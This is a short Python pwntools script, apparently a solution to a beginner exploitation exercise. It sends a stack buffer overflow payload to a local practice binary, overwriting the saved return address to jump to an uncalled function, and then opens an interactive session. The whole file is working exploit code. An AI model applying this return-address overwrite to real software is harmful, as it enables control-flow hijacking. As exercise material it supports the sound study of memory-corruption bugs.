#!/usr/bin/python

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=64)

p = process('./03-x86-64')
# p = gdb.debug(['./03-x86-64'])

payload = ''
payload += 'a' * 128     # buffer
payload += 'b' * 8       # old rbp
payload += p64(0x40057d) # not_called address

p.send(payload)

p.interactive()
